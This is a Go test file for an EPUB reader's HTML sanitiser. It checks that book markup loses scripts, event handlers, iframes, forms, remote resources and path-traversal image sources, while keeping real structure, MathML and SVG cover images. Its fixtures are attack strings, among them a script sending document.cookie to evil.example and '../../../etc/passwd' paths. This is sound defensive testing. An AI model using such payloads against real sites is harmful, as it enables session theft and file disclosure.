// SPDX-License-Identifier: AGPL-3.0-or-later

package epub

import (
	"bytes"
	"strings"
	"testing"
)

func assetURL(p string) string { return "/api/v1/books/test/assets/" + p }

// Book HTML is a zip file from the internet. The sanitiser is the boundary
// between that and the user's DOM, so it is tested against what an attacker
// would actually try.
func TestSanitiseRemovesActiveContent(t *testing.T) {
	attacks := []struct {
		name  string
		html  string
		gone  []string
		keeps string
	}{
		{
			name:  "inline script",
			html:  `<body><p>Chapter one.</p><script>fetch('https://evil.example/'+document.cookie)</script></body>`,
			gone:  []string{"<script", "fetch(", "document.cookie"},
			keeps: "Chapter one.",
		},
		{
			name:  "event handler",
			html:  `<body><p onclick="steal()">Click me</p></body>`,
			gone:  []string{"onclick", "steal()"},
			keeps: "Click me",
		},
		{
			name:  "image error handler",
			html:  `<body><img src="x.png" onerror="alert(1)" alt="cover"></body>`,
			gone:  []string{"onerror", "alert(1)"},
			keeps: "cover",
		},
		{
			name:  "iframe",
			html:  `<body><iframe src="https://evil.example"></iframe><p>text</p></body>`,
			gone:  []string{"<iframe", "evil.example"},
			keeps: "text",
		},
		{
			name:  "javascript URL",
			html:  `<body><a href="javascript:alert(1)">link</a></body>`,
			gone:  []string{"javascript:"},
			keeps: "link",
		},
		{
			name:  "remote stylesheet",
			html:  `<body><link rel="stylesheet" href="https://evil.example/track.css"><p>text</p></body>`,
			gone:  []string{"<link", "evil.example"},
			keeps: "text",
		},
		{
			name: "publisher stylesheet is dropped, not sanitised",
			html: `<body><style>p { position: fixed; width: 900px }</style><p>text</p></body>`,
			// Book CSS fights the reader's column layout and is discarded whole.
			gone:  []string{"<style", "position: fixed"},
			keeps: "text",
		},
		{
			name:  "object and embed",
			html:  `<body><object data="x.swf"></object><embed src="y.swf"><p>text</p></body>`,
			gone:  []string{"<object", "<embed", ".swf"},
			keeps: "text",
		},
		{
			name:  "form posting elsewhere",
			html:  `<body><form action="https://evil.example"><input name="x"></form><p>text</p></body>`,
			gone:  []string{"<form", "<input", "evil.example"},
			keeps: "text",
		},
		{
			name:  "svg with script",
			html:  `<body><svg><script>alert(1)</script></svg><p>text</p></body>`,
			gone:  []string{"<script", "alert(1)"},
			keeps: "text",
		},
		{
			name:  "meta refresh",
			html:  `<body><meta http-equiv="refresh" content="0;url=https://evil.example"><p>text</p></body>`,
			gone:  []string{"http-equiv", "evil.example"},
			keeps: "text",
		},
	}

	for _, tt := range attacks {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitiseDocument(tt.html, "OEBPS/ch1.xhtml", assetURL, nil, 0)
			lower := strings.ToLower(got)
			for _, forbidden := range tt.gone {
				if strings.Contains(lower, strings.ToLower(forbidden)) {
					t.Errorf("output still contains %q:\n%s", forbidden, got)
				}
			}
			if tt.keeps != "" && !strings.Contains(got, tt.keeps) {
				t.Errorf("sanitising removed the actual text %q:\n%s", tt.keeps, got)
			}
		})
	}
}

// A book is worthless if sanitising strips the book.
func TestSanitiseKeepsRealBookStructure(t *testing.T) {
	html := `<body>
		<h1 id="ch1">Chapter One</h1>
		<p>A paragraph with <em>emphasis</em>, <strong>strength</strong>, and a
		   <a href="ch02.xhtml#sec2">cross-reference</a>.</p>
		<blockquote><p>A quotation.</p></blockquote>
		<pre><code>func main() {}</code></pre>
		<ul><li>one</li><li>two</li></ul>
		<table><thead><tr><th scope="col">h</th></tr></thead><tbody><tr><td colspan="2">cell</td></tr></tbody></table>
		<figure><img src="images/fig1.png" alt="a figure"><figcaption>Figure 1</figcaption></figure>
		<p>Water is <math><msub><mi>H</mi><mn>2</mn></msub><mi>O</mi></math>.</p>
		<p>A footnote reference<sup id="fnref1">1</sup>.</p>
	</body>`

	got := sanitiseDocument(html, "OEBPS/text/ch01.xhtml", assetURL, nil, 0)

	for _, want := range []string{
		"Chapter One", `id="ch1"`, "<em>", "<strong>", "cross-reference",
		"<blockquote>", "<pre>", "<code>", "func main() {}",
		"<ul>", "<li>", "<table>", `scope="col"`, `colspan="2"`,
		"<figure>", "<figcaption>", "Figure 1", "a figure",
		"<math>", "<msub>", "<sup", `id="fnref1"`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("sanitising removed %q:\n%s", want, got)
		}
	}
}

// Images must be rewritten to the asset endpoint, resolved relative to the
// document that referenced them.
func TestSanitiseRewritesImagesToTheAssetEndpoint(t *testing.T) {
	got := sanitiseDocument(
		`<body><img src="../images/cover.png" alt="cover"><img src='fig.jpg' alt="fig"></body>`,
		"OEBPS/text/ch01.xhtml", assetURL, nil, 0)

	if !strings.Contains(got, "/api/v1/books/test/assets/OEBPS/images/cover.png") {
		t.Errorf("relative image was not resolved and rewritten:\n%s", got)
	}
	if !strings.Contains(got, "/api/v1/books/test/assets/OEBPS/text/fig.jpg") {
		t.Errorf("single-quoted image was not rewritten:\n%s", got)
	}
}

// A book must not be able to make the reader fetch an arbitrary URL - that is a
// tracking pixel, and on a self-hosted reader it leaks that the user opened
// this book at this moment.
func TestSanitiseBlocksRemoteAndTraversingImages(t *testing.T) {
	for _, src := range []string{
		"https://tracker.example/pixel.gif",
		"//tracker.example/pixel.gif",
		"../../../etc/passwd",
	} {
		got := sanitiseDocument(`<body><img src="`+src+`" alt="text stays"></body>`,
			"OEBPS/text/ch01.xhtml", assetURL, nil, 0)

		if strings.Contains(got, "tracker.example") {
			t.Errorf("remote image %q survived:\n%s", src, got)
		}
		if strings.Contains(got, "etc/passwd") {
			t.Errorf("traversing image %q survived:\n%s", src, got)
		}
	}
}

func TestSanitiseExtractsBodyOnly(t *testing.T) {
	got := sanitiseDocument(
		`<?xml version="1.0"?><html><head><title>Should not appear</title>
		<link rel="stylesheet" href="style.css"/></head><body><p>Body text</p></body></html>`,
		"OEBPS/ch1.xhtml", assetURL, nil, 0)

	if strings.Contains(got, "Should not appear") {
		t.Errorf("the document head leaked into the output:\n%s", got)
	}
	if !strings.Contains(got, "Body text") {
		t.Errorf("the body was lost:\n%s", got)
	}
}

// A document with no <body> - a fragment, or malformed markup - must still
// produce usable text rather than nothing.
func TestSanitiseHandlesMissingBody(t *testing.T) {
	got := sanitiseDocument(`<p>A bare fragment.</p>`, "OEBPS/ch1.xhtml", assetURL, nil, 0)
	if !strings.Contains(got, "A bare fragment.") {
		t.Errorf("a body-less fragment produced nothing usable: %q", got)
	}
}

func TestReaderServesSpineItems(t *testing.T) {
	data, size := newEPUB3(t)

	r, err := Open(bytes.NewReader(data), size)
	if err != nil {
		t.Fatalf("Open: %v", err)
	}

	if len(r.Spine()) != 3 {
		t.Fatalf("got %d spine items, want 3", len(r.Spine()))
	}

	first, err := r.SpineItem(0, assetURL)
	if err != nil {
		t.Fatalf("SpineItem(0): %v", err)
	}
	if !strings.Contains(first, "One") {
		t.Errorf("first spine item = %q", first)
	}

	second, err := r.SpineItem(1, assetURL)
	if err != nil {
		t.Fatalf("SpineItem(1): %v", err)
	}
	if !strings.Contains(second, "Two") {
		t.Errorf("second spine item = %q", second)
	}
	// Reading order must be the spine's, and items must not bleed together.
	if strings.Contains(first, "Two") {
		t.Error("the first spine item contains the second item's text")
	}

	for _, bad := range []int{-1, 3, 99} {
		if _, err := r.SpineItem(bad, assetURL); err == nil {
			t.Errorf("SpineItem(%d) succeeded on an out-of-range index", bad)
		}
	}
}

func TestReaderServesImagesOnly(t *testing.T) {
	data, size := newEPUB3(t)

	r, err := Open(bytes.NewReader(data), size)
	if err != nil {
		t.Fatalf("Open: %v", err)
	}

	img, mediaType, err := r.Asset("OEBPS/images/cover.png")
	if err != nil {
		t.Fatalf("Asset: %v", err)
	}
	if mediaType != "image/png" {
		t.Errorf("mediaType = %q", mediaType)
	}
	if string(img) != "PNG-BYTES" {
		t.Errorf("asset = %q", img)
	}

	// Serving anything else would reintroduce exactly what sanitising removed.
	for _, notAnImage := range []string{
		"OEBPS/content.opf", "OEBPS/nav.xhtml", "META-INF/container.xml", "mimetype",
	} {
		if _, _, err := r.Asset(notAnImage); err == nil {
			t.Errorf("Asset(%q) served a non-image", notAnImage)
		}
	}

	// And nothing outside the archive.
	for _, escape := range []string{"../../../etc/passwd", "/etc/passwd"} {
		if _, _, err := r.Asset(escape); err == nil {
			t.Errorf("Asset(%q) escaped the archive", escape)
		}
	}
}

// A technical library is full of maths. bluemonday drops an allowed element
// that has no permitted attributes, which silently collapsed MathML to bare
// text: "H₂O" became "H2O" with the markup gone and the equation quietly wrong.
func TestSanitiseKeepsMathML(t *testing.T) {
	cases := map[string][]string{
		`<body><p>Water is <math><msub><mi>H</mi><mn>2</mn></msub><mi>O</mi></math>.</p></body>`: {
			"<math>", "<msub>", "<mi>", "<mn>",
		},
		`<body><math><mfrac><mrow><mi>a</mi></mrow><mrow><mi>b</mi></mrow></mfrac></math></body>`: {
			"<mfrac>", "<mrow>",
		},
		`<body><math><msqrt><mi>x</mi></msqrt><msup><mi>e</mi><mi>x</mi></msup></math></body>`: {
			"<msqrt>", "<msup>",
		},
	}

	for html, wants := range cases {
		t.Run(html[:40], func(t *testing.T) {
			got := sanitiseDocument(html, "OEBPS/ch1.xhtml", assetURL, nil, 0)
			for _, want := range wants {
				if !strings.Contains(got, want) {
					t.Errorf("MathML element %q was stripped:\n%s", want, got)
				}
			}
		})
	}
}

// Structural elements carrying no attributes hit the same bluemonday trap.
func TestSanitiseKeepsBareStructuralElements(t *testing.T) {
	got := sanitiseDocument(
		`<body><section><h2>Heading</h2><p>Text with <em>emphasis</em> and <code>code</code>.</p>`+
			`<blockquote><p>Quote</p></blockquote><ul><li>item</li></ul></section></body>`,
		"OEBPS/ch1.xhtml", assetURL, nil, 0)

	for _, want := range []string{"<section>", "<h2>", "<p>", "<em>", "<code>", "<blockquote>", "<ul>", "<li>"} {
		if !strings.Contains(got, want) {
			t.Errorf("bare element %q was stripped:\n%s", want, got)
		}
	}
}

// The cover page of every Project Gutenberg EPUB is an SVG framing one
// picture. The policy drops SVG, and the picture used to go with it: the
// first page of the book was blank.
func TestSanitiseKeepsTheImageInsideAnSVGCover(t *testing.T) {
	gutenberg := `<body class="x-ebookmaker-coverpage">
  <div class="x-ebookmaker-cover">
    <svg xmlns="http://www.w3.org/2000/svg" height="100%" preserveAspectRatio="xMidYMid meet" version="1.1" viewBox="0 0 1500 2114" width="100%" xmlns:xlink="http://www.w3.org/1999/xlink">
      <image width="1500" height="2114" xlink:href="images/cover.jpg"/>
    </svg>
  </div>
</body>`

	got := sanitiseDocument(gutenberg, "OEBPS/wrap0000.xhtml", assetURL, nil, 0)
	for _, want := range []string{
		`src="/api/v1/books/test/assets/OEBPS/images/cover.jpg"`,
		`width="1500"`,
		`height="2114"`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("the cover lost %q:\n%s", want, got)
		}
	}
	if strings.Contains(strings.ToLower(got), "<svg") || strings.Contains(got, "<image") {
		t.Errorf("SVG reached the output:\n%s", got)
	}

	// SVG 2 spells it plain href, and quoting is the book's choice.
	got = sanitiseDocument(`<body><svg><image href='c.png' width='600px' height="800"/></svg></body>`,
		"OEBPS/text/cover.xhtml", assetURL, nil, 0)
	if !strings.Contains(got, `src="/api/v1/books/test/assets/OEBPS/text/c.png"`) ||
		!strings.Contains(got, `width="600"`) || !strings.Contains(got, `height="800"`) {
		t.Errorf("an SVG 2 cover was not kept:\n%s", got)
	}
}

// The picture is an ordinary image from there on, so everything an ordinary
// image may not do, it may not do either - and nothing else in the SVG comes
// with it.
func TestSVGPicturesAreHeldToTheImageRules(t *testing.T) {
	for _, tt := range []struct{ name, html, gone string }{
		{"remote picture", `<svg><image xlink:href="https://tracker.example/p.gif"/></svg>`, "tracker.example"},
		{"traversing picture", `<svg><image href="../../../etc/passwd"/></svg>`, "etc/passwd"},
		{"script beside the picture", `<svg><script>alert(1)</script><image href="c.jpg"/></svg>`, "alert(1)"},
		{"handler on the picture", `<svg><image href="c.jpg" onload="alert(1)"/></svg>`, "onload"},
		{"data-href is not href", `<svg><image data-href="c.jpg"/></svg><p>text</p>`, "c.jpg"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitiseDocument("<body>"+tt.html+"</body>", "OEBPS/ch1.xhtml", assetURL, nil, 0)
			if strings.Contains(got, tt.gone) {
				t.Errorf("output still contains %q:\n%s", tt.gone, got)
			}
			if strings.Contains(strings.ToLower(got), "<svg") {
				t.Errorf("SVG reached the output:\n%s", got)
			}
		})
	}
}

// A picture where nothing was before must not move anything a locator names.
// Paths count same-named siblings, and an <img> is neither a block nor
// anybody's ancestor, so the paragraphs around it keep their addresses.
func TestSVGPicturesLeaveBlockPathsAlone(t *testing.T) {
	doc := `<body><div><svg><image href="c.jpg"/></svg><p>one</p><p>two</p></div></body>`
	plain := `<body><div><p>one</p><p>two</p></div></body>`

	blocks := func(html string) []TextBlock {
		return blocksOf(t, sanitiseDocument(html, "OEBPS/ch1.xhtml", assetURL, nil, 0))
	}
	got, want := blocks(doc), blocks(plain)
	if len(got) != len(want) {
		t.Fatalf("blocks: got %v, want %v", got, want)
	}
	for i := range got {
		if got[i] != want[i] {
			t.Errorf("block %d: got %v, want %v", i, got[i], want[i])
		}
	}
}
